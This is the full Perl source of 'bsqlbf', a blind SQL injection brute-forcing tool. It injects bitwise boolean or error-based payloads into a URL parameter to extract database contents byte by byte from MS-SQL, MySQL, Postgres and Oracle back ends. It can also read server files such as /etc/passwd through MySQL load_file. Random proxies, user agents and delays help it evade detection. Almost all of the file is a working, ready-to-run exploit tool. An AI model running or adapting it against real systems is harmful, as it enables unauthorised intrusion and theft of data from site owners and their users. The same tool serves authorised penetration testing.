#!/usr/bin/env perl
# Blind SQL Injection POC. aramosf@514.es // http://www.514.es
#modified by sid//sid@notsosecure.com
# 
#
# TODO:
# [ ] Rip more code from others.

use LWP::UserAgent;
use Getopt::Long;
use IO::Handle;
use strict;
use threads;
use threads::shared;
use Time::HiRes qw( usleep);

$| = 1;


###############################################################################
my $default_debug = 0;
my $default_length = 32;
my $default_method = "GET";
my $default_time = 0;
my $version = "2.0";
my $default_useragent = "bsqlbf $version";
my $default_sql = "(select \@\@version)";
###############################################################################


$| = 1;

my ($args, $solution);
my (%vars, @varsb);
my ($lastvar, $lastval);
my ($scheme, $authority, $path, $query, $fragment);
my ($head, $tail, $high);
my $hits = 0; 
my $amatch = 0;
my ($ua,$req);
my $furl;

###############################################################################
# Define GetOpt:
my ($url, $type, $database, $sql, $time, $rtime, $match, $uagent, $debug);
my ($proxy, $proxy_user, $proxy_pass,$rproxy, $ruagent); 
my ($start, $length, $method, $cookie, $blind);
my ($help, $get);
my ($ascii, $binary);

my $options = GetOptions (
  'help!'            => \$help, 
  'url=s'            => \$url,
  'database=s'		 => \$database,
  'type=s'			 => \$type,	
  'get=s'            => \$get,
  'sql=s'            => \$sql,
  'blind=s'          => \$blind,
  'match=s'          => \$match,
  'start=s'          => \$start,
  'length=s'         => \$length,
  'method=s'	     => \$method,
  'uagent=s'	     => \$uagent,
  'ruagent=s'	     => \$ruagent,
  'cookie=s'	     => \$cookie,
  'proxy=s'          => \$proxy,
  'proxy_user=s'     => \$proxy_user,
  'proxy_pass=s'     => \$proxy_pass,
  'rproxy=s'         => \$rproxy,
  'debug!'           => \$debug, 
  'binary!'           =>\$binary, 
  'ascii!'           => \$ascii, 
  'rtime=s'          => \$rtime, 
  'time=i'           => \$time 
  );

&help unless ($url);
&help if $help eq 1;

#########################################################################
# Default Options.
$uagent         ||= $default_useragent; 
$debug          ||= $default_debug; 
$length         ||= $default_length; 
$solution       ||= $start;
$method         ||= $default_method;
$sql            ||= $default_sql;
$time           ||= $default_time;


&createlwp();
&parseurl();

if ( ! defined($blind)) {
		$lastvar = $varsb[$#varsb];
		$lastval = $vars{$lastvar};
} else {
		$lastvar = $blind;
		$lastval = $vars{$blind};
}

if (! defined($type)) {
	$type=0;
}

if (! defined($database)) {
	$database=0
}

if (defined($cookie)) { &cookie() }
if (!$match) {
	print "\nTrying to find a match string...\n" if $debug == 1;
	$amatch = "1";
	$match = fmatch("$url"," AND 1=");
	if ($match eq "no vulnerable") 
		{ 
		print "\nNo vuln: 2nd..\n" if $debug ==1;
		$match = fmatch("$url"," AND 1='");
		#$head = "\"";
		#$tail = " AND 1=\"1";
	};
	if ($match eq "no vulnerable") { 
		print "Not vulnerable \n\n If you know its vulnerable supply the '-match' string\n";
		exit 0; 
	} 
}
&banner();
&httpintro();


 
( ! $get) ? sqlget() : fileget();

my @byte = ();
my $wait_me;

sub getbyte {
   my $sql = $_[0];
   my $bit="";
   my @thread_count = ();
   my $c = 8;
   my $i = 0;
   $high = 128 unless $ascii;#) ? 128 : { 64; $byte[0] = 0; };
   $wait_me = 0; 

   share($wait_me);
   share (@byte);

   if ($ascii) {
     $byte[0] = 0; 
     $high = 64;
   }
   for ($bit=1;$bit<=$high;$bit*=2) {
# launch thread ->
	$thread_count[$i] = threads->create(\&launch_thread ,$sql, $bit, $c);
	$thread_count[$i]->detach;
	$c--;
   }

   while ($wait_me <= 7) {
	usleep(50);
	#sleep(1);# if !$dontsleep;
   }

   my $str = join("",@byte);
   #print "\nSTR: $str\n";
   return pack("B*","$str");

}

sub launch_thread {
	my ($sql, $bit, $c) = @_;
	my $val;	
	my $and="%26";
	 if (lc($method) eq "post"){
	 $and="&";
	 }
	 ###------------MS-SQL BLOCK STARTS HERE---------------------###

if ($database==0) {


#print "I am here";
		if ($url =~ /'$/) {
      ##   $val = "$head and (ASCII($sql) $and $bit)=0-- $tail";
 if ($type==1) 
					  { 
						 $val = "$head and (select case when((ASCII($sql) $and $bit) =0) then 1 else 1/0 end )=1-- $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0-- $tail";
					  } 
				   }  

	}
		  		  else{
					   if ($type==1) 
					  { 
						 $val = "$head and (select case when ((ASCII($sql) $and $bit) =0)then 1 else 1/0 end)=1 $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0 $tail";
					  } 
				   }  
			   
				  } 


				}


	 ###------------MS-SQL BLOCK STOPS HERE---------------------###
	 ###----------POSTGRES BLOCK STARTS HERE---------------------###

if ($database==2) {



		if ($url =~ /'$/) {
    
 if ($type==1) 
	
					  { 
						 $val = "$head and (case when ((ASCII($sql) $and $bit) =0) then 1 else (1 * (select 1 from information_schema.tables)) end)=1-- $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0-- $tail";
					  } 
				   }  

	}
		  		  else{
					   if ($type==1) 
					  { 
						 $val = "$head and (case when ((ASCII($sql) $and $bit) =0) then 1 else (1 * (select 1 from information_schema.tables)) end)=1 $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0 $tail";
					  } 
				   }  
			   
				  } 


				}
###----------POSTGRES BLOCK STOPS HERE---------------------###
###----------ORACLE BLOCK STARTS---------------------------####
	 if ($database==3) {
	 
if ($url =~ /'$/) {
          if ($type==1) 
	
					  { 
						 $val = "$head and (select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual)=1-- $tail";
					  }
			  else {	if($type==0)
					  {	   
						 $val = "$head and BITAND((ASCII($sql)), $bit)=0-- $tail";					  } 
				   }  

	}
		  		  else{
					   if ($type==1) 
					  { 
						 $val = "$head and (select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual)=1 $tail";
					  }
			  else {	if($type==0)
					  {	   
			   $val = "$head and (select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual)=1 $tail";
					  } 
				   }  
			   
				  } 
						}


###----------ORACLE BLOCK STOPS HERE---------------------------####
###------------MY-SQL BLOCK STARTS HERE---------------------###

	
	if ($database==1) {
	
	
	if ($url =~ /'$/)		{
          if ($type==1) 
					  { 
						 $val = "$head and (select case when (ord($sql) $and $bit=0 ) then 1 else 1*(select table_name from information_schema.tables)end)=1 $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ord($sql) $and $bit)=0 $tail";
					  } 
				   }  
# or one may also use #
							}
		  	
				  else
					 
				{
					  if ($type==1) 
					  { 
						 $val = "$head and (select case when (ord($sql) $and $bit=0 ) then 1 else 1*(select table_name from information_schema.tables)end)=1 $tail";
					  }
			  else {if($type==0)
					  {	   
			  $val = "$head and (ord($sql) $and $bit)=0 $tail";
					  } 
					}  
				 

				}
###-----------MySQL BLOCK ENDS HERE-------------------###




 }
				  #print "VAL[$c] $val\n";
        if (lc($method) eq "post") {
                $vars{$lastvar} = $lastval . $val;

        }
        $furl = $url;
        $furl =~ s/($lastvar=$lastval)/$1$val/;
        &createlwp if $rproxy || $ruagent;
        my $html=fetch("$furl");
        $hits++;
        foreach (split(/\n/,$html)) {
		lock @byte;
                if (/\Q$match\E/) {
                    $byte[$c]=0;
                    last;
                 } else { $byte[$c] = 1; }
        }
	lock $wait_me;
	threads->yield();
	$wait_me++;
}

sub sqlget									{


	##--ms-sqlblock--##




if ($database==0 ) {

my ($fsize,$i,$s);
        $s = "SUBSTRING(cast(len(len(($sql)))as varchar),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "SUBSTRING(cast(len(($sql))as varchar),$i,1)";
		$fsize.=getbyte($s);
	}

	#print "FSIZE: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		$s = "substring(cast(($sql)as varchar),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}


}

	##--ms-sql block-finish--##
	##---oracle block starts--##
if ($database==3) {

	my ($fsize,$i,$s);
        $s = "SUBSTR(cast(length(length(($sql)))as varchar(100)),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "SUBSTR(cast(length(($sql))as varchar(100)),$i,1)";
		$fsize.=getbyte($s);
	}

	print "FSIZE: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		$s = "substr(cast(($sql)as varchar(100)),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}
}


	##---oracle block finish--##
##--postgres block----##
if ($database==2) {
my ($fsize,$i,$s);
	
        $s = "SUBSTR(cast(length(length(($sql)))as varchar),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "SUBSTR(cast(length(($sql))as varchar),$i,1)";
		$fsize.=getbyte($s);
	}

	print "FSIZE: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		
		$s = "substr(cast(($sql)as varchar),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}


}

	##--postgres block-finish--##
	##-mysql block--##
	if ($database==1) {
		my ($fsize,$i,$s);
        $s = "mid(length(length(($sql))),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "mid(length(($sql)),$i,1)";
		$fsize.=getbyte($s);
	}
	
	#print "FSIZE: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		$s = "mid(($sql),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}
}

##-mysql-block-##
										}

#---------------end-------------------#
sub fileget {
	my ($lget,$fstr);
	if ($get =~ m/.*\/(.*)/) {
		$lget = $1; }
		$fstr = "0x".unpack("H*","$get");
	if ($get =~ m/.*\\(.*)/) {
		$lget = $1;
		$fstr = "\"$get\"";
	}

	my $rsize = $start + 1;
	if (-e "$lget" && ! $start) { 
		$rsize = -s "$lget";
		print "Error: file ./$lget exists.\n"; 
		print "You can erase or resume it with: -start $rsize\n";
		exit 1
	}
	my ($i,$fsize);
	$sql = "mid(length(length(load_file($fstr))),1,1)";
	my $lng .= getbyte($sql);
	for ($i=1;$i<=$lng;$i++) {
		my $find = 0;
		$sql = "mid(length(load_file($fstr)),$i,1)";
		$fsize.=getbyte($sql);
	}

	if ($fsize < "1") { print "Error: file not found, no permissions or ... who knows\n"; exit 1 }
	$length = $fsize. "bytes";
	# starting ..
	$sql = "load_file($get)";

	&bsqlintro();
	# Get file
	#print "---> $lget";
	open FILE, ">>$lget";
	FILE->autoflush(1);
	print "\n--- BEGIN ---\n";
	my ($i,$b,$fcontent);
	$rsize = 1 if $rsize < 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		my $find = 0;
		my ($furl, $b_start, $b_end, $z);
		$sql = "mid(load_file($fstr),$i,1)";
		$fcontent=getbyte($sql);
		print $fcontent;
		print FILE "$fcontent";
 	}
	print "\n--- END ---\n";
        close FILE;
	$solution = "success";
	$sql = "$get";
}



&result();



#########################################################################
sub httpintro {
	my ($strcookie, $strproxy, $struagent, $strtime, $i);
	print "--[ http options ]"; print "-"x62; print "\n";
	printf ("%12s %-8s %11s %-20s\n","schema:",$scheme,"host:",$authority);
	if ($ruagent) { $struagent="rnd.file:$ruagent" } else { $struagent = $uagent }
	printf ("%12s %-8s %11s %-20s\n","method:",uc($method),"useragent:",$struagent);
	printf ("%12s %-50s\n","path:", $path);
	foreach (keys %vars) {
		$i++;
		printf ("%12s %-15s = %-40s\n","arg[$i]:",$_,$vars{$_});
	}
	if (! $cookie) { $strcookie="(null)" } else { $strcookie = $cookie; }
	printf ("%12s %-50s\n","cookies:",$strcookie);
	if (! $proxy && !$rproxy) { $strproxy="(null)" } else { $strproxy = $proxy; }
	if ($rproxy) { $strproxy = "rnd.file:$rproxy" }
	printf ("%12s %-50s\n","proxy_host:",$strproxy);
	if (! $proxy_user) { $strproxy="(null)" } else { $strproxy = $proxy_user; }
 	# timing
	if (! $time && !$rtime) { $strtime="0sec (default)" } 
	if ( $time == 0) { $strtime="0 sec (default)" } 
	if ( $time == 1) { $strtime="15 secs" } 
	if ( $time == 2) { $strtime="5 mins" } 
	if ($rtime) { $strtime = "rnd.time:$rtime" }
	printf ("%12s %-50s\n","time:",$strtime);
	printf("\n\nFinding Length of SQL Query....\n");
}

sub bsqlintro {
	my ($strstart, $strblind, $strlen, $strmatch, $strsql);
	print "\n--[ blind sql injection options ]"; print "-"x47; print "\n";
	if (! $start) { $strstart = "(null)"; } else { $strstart = $start; }
	if (! $blind) { $strblind = "(last) $lastvar"; } else { $strblind = $blind; }
	printf ("%12s %-15s %11s %-20s\n","blind:",$strblind,"start:",$strstart);
	printf ("%12s %-15s %11s %-20s\n","database:",$database,"type:",$type);
	if ($length eq $default_length) { $strlen = "$length (default)" } else { $strlen = $length; }
	if ($sql eq $default_sql) { $strsql = "$sql (default)"; } else { $strsql = $sql; }
	printf ("%12s %-15s %11s %-20s\n","length:",$strlen,"sql:",$strsql);
	if ($amatch eq 1) { $strmatch = "auto match:(!!THIS MAY BE WRONG!!)" } else { $strmatch = "match:"; }
	#printf ("%12s %-60s\n","$strmatch",$match);
	print " $strmatch $match\n";
	print "-"x80; print "\n\n";
	printf "\n Getting Data...\n";
}

#########################################################################

sub createlwp {
	my $proxyc;
	&getproxy;
	&getuagent if $ruagent;
	LWP::Debug::level('+') if $debug gt 3;
	$ua = new LWP::UserAgent(
        cookie_jar=> { file => "$$.cookie" }); 
	$ua->agent("$uagent");
	if (defined($proxy_user) && defined($proxy_pass)) {
		my ($pscheme, $pauthority, $ppath, $pquery, $pfragment) =
		$proxy =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		$proxyc = $pscheme."://".$proxy_user.":".$proxy_pass."@".$pauthority;
	} else { $proxyc = $proxy; }
	
	$ua->proxy(['http'] => $proxyc) if $proxy;
	undef $proxy if $rproxy;
	undef $uagent if $ruagent;
}	

sub cookie {
	# Cookies check
	if ($cookie || $cookie =~ /; /) {
		foreach my $c (split /;/, $cookie) {
			my ($a,$b) = split /=/, $c;
			if ( ! $a || ! $b ) { die "Wrong cookie value. Use -h for help\n"; }
		}
	}
}

sub parseurl {
 ###############################################################################
 # Official Regexp to parse URI. Thank you somebody.
	($scheme, $authority, $path, $query, $fragment) =
		$url =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
	# Parse args of URI into %vars and @varsb.
	foreach my $varval (split /&/, $query) {
		my ($var, $val) = split /=/, $varval;
		$vars{$var} = $val;
		push(@varsb, $var);
	}
}


#########################################################################
# Show options at running:
sub banner {
		print "\n // Blind SQL injection brute forcer \\\\ \n //originally written by...aramosf\@514.es  http://www.514.es \\\\ \n";
	print " \n // mofified by sid-at-notsosecure.com \\\\ \n // http://www.notsosecure.com \\\\ \n";
}


#########################################################################
# Get differences in HTML
sub fmatch {
 my ($ok,$rtrn);
 my ($furla, $furlb,$quote) = ($_[0], $_[0],$_[1]);
 my ($html_a, $html_b);
 if (lc($method) eq "get") {
	$furla =~ s/($lastvar=$lastval)/$1 ${quote}1/;
	$furlb =~ s/($lastvar=$lastval)/$1 ${quote}0/;
 	$html_a = fetch("$furla");
	$html_b = fetch("$furlb");
 } elsif (lc($method) eq "post") {
   $vars{$lastvar} = $lastval . " ${quote}1";
   $html_a = fetch("$furla");
   $vars{$lastvar} = $lastval . " ${quote}0";
   $html_b = fetch("$furla");
   $vars{$lastvar} = $lastval;
 }


 #print "$html_a";
 #print "$html_b";

 if ($html_a eq $html_b) {
  $rtrn = "no vulnerable";
  return $rtrn;
 }


 my @h_a = split(/\n/,$html_a);
 my @h_b = split(/\n/,$html_b);
 foreach my $a (@h_a) {
	$ok = 0;
	if ($a =~ /\w/) {
   		foreach (@h_b) {
		    if ($a eq $_) {$ok = 1; }
		}
	} else { $ok = 1; }
   $rtrn = $a;
   last if $ok ne 1;
 }
 return $rtrn;
}


#########################################################################
# Fetch HTML from WWW
sub fetch {
	#print "fetch: $_[0]\n";
	my $secs;
	if ($time == 0) { $secs = 0 }
	elsif ($time == 1) { $secs = 15 }
	elsif ($time == 2) { $secs = 300 }
	if ($rtime =~ /\d*-\d*/ && $time == 0) {
		my ($l,$p) = $rtime =~ m/(\d+-\d+)/;
		srand; $secs = int(rand($p-$l+1))+$l;
	} elsif ($rtime =~ /\d*-\d*/ && $time != 0) {
		print "You can't run with -time and -rtime. See -help.\n";
		exit 1;
	}
	sleep $secs;
	
	my $res;
	if (lc($method) eq "get") {
		my $fetch = $_[0];
		if ($cookie) {
			$res = $ua->get("$fetch", Cookie => "$cookie");
		} elsif (!$cookie) {
			$res = $ua->get("$fetch");
		}
	} elsif (lc($method) eq "post") {
		my($s, $a, $p, $q, $f) =
  	    $url=~m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		my $fetch = "$s://$a".$p;
		if ($cookie) {
	    	$res = $ua->post("$fetch",\%vars, Cookie => "$cookie");
		} elsif (!$cookie) {
		    $res = $ua->post("$fetch",\%vars);
		}
	} else {
		die "Wrong httpd method. Use -h for help\n";
	}
	my $html = $res->content();
	return $html;
}


sub getproxy {
	if ($rproxy && $proxy !~ /http/) {
		my @lproxy;
		open PROXY, $rproxy or die "Can't open file: $rproxy\n";
		while(<PROXY>) { push(@lproxy,$_) if ! /^#/ }
		close PROXY;
		srand; my $ind = rand @lproxy;
		$proxy = $lproxy[$ind];
	} elsif ($rproxy && $proxy =~ /http/)  {
		print "You can't run with -proxy and -rproxy. See -help.\n";
		exit 1;
	}
}

sub getuagent {
		my @uproxy;
		open UAGENT, $ruagent or die "Can't open file: $ruagent\n";
		while(<UAGENT>) { push(@uproxy,$_) if ! /^#/ }
		close UAGENT;
		srand; my $ind = rand @uproxy;
		$uagent = $uproxy[$ind];
		chop($uagent);
}

sub result {
	print "\r results:\n" ." $sql = $solution\n" if length($solution) > 0; 
	#print " total hits: $hits\n";
	my $blah= length($solution);
	if ($blah<2)
	{print "\n !!!!!!Errrrrrrr.. something is not quite right.. see below!!!!!\n";
	 print "-------------------------------------------------------";
	 print "\n1 In a string based injection, vulnerable parameter must end with single quote(')\n\t eg. blah.php?id=foo'";
	 print "\n2 AND don't forget to provide me a unique true response with -match";
	 print "\n3 Also Check that the SQL Query you supplied returns only one row\n";
	 print "-------------------------------------------------------\n\n\n";
	}
}

sub help {
	&banner();
		print " ---------------------usage:-------------------------------------------\n";
	print"\nInteger based Injection-->$0 - url http://www.host.com/path/script.php?foo=1000 [options]\n ";
	print "\nString Based Injection-->$0 - url http://www.host.com/path/script.php?foo=bar' [options]\n  ";
	print "\n ------------------------------------options:--------------------------\n";
	print " -sql:\t\tvalid SQL syntax to get; version(), database(),\n";
	print "\t\t\query like-->(select  table_name from inforamtion_schema.tables limit 1 offset 0)\n"; 
	print " -get: \t\tIf MySQL user is root, supply word readable file name\n";
	print " -blind:\tparameter to inject sql. Default is last value of url\n";
	print " -match:\t*RECOMMENDED* string to match in valid query, Default is try to get auto\n";
	print " -start:\tif you know the beginning of the string, use it.\n";
	print " -length:\tmaximum length of value. Default is $default_length.\n";
	print " -time:\t\ttimer options:\n";
	print " \t0:\tdont wait. Default option.\n";
	print " \t1:\twait 15 seconds\n";
	print " \t2:\twait 5 minutes\n";
	print " -type:\t\tType of injection:\n";
	print " \t0:\tType 0 (default) is blind injection based on True and False responses\n";
	print " \t1:\tType 1 is blind injection based on True and Error responses\n";
	print " -database:\tBackend database:\n";
	print " \t0:\tMS-SQL (Default)\n";
	print " \t1:\tMYSQL\n";
	print " \t2:\tPOSTGRES\n";
	print " \t3:\tORACLE\n";
	print " -rtime:\twait random seconds, for example: \"10-20\".\n";
	print " -method:\thttp method to use; get or post. Default is $default_method.\n";
	print " -uagent:\thttp UserAgent header to use. Default is $default_useragent\n";
	print " -ruagent:\tfile with random http UserAgent header to use.\n";
	print " -cookie:\thttp cookie header to use\n";
	print " -rproxy:\tuse random http proxy from file list.\n";
	print " -proxy:\tuse proxy http. Syntax: -proxy=http://proxy:port/\n";
	print " -proxy_user:\tproxy http user\n";
	print " -proxy_pass:\tproxy http password\n";
    print "\n---------------------------- examples:-------------------------------\n";
	print "bash# $0 -url http://www.somehost.com/blah.php?u=5 -blind u -sql \"select table_name from imformation_schema.tables limit 1 offset 0\" -database 1 -type 1\n";
    print "bash# $0 -url http://www.buggy.com/bug.php?r=514&p=foo' -method post -get \"/etc/passwd\" -match \"foo\"\n";
    exit(1);
}